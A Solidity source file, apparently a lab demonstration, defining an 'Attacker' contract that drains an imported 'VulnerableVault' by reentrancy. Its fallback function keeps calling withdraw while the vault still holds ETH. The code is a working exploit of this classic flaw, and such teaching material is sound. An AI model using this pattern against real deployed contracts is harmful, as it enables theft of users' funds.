// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    // inicia o ataque
    function attack() external payable {
        require(msg.value > 0, "Send ETH");

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // executado quando o vault envia ETH
    fallback() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
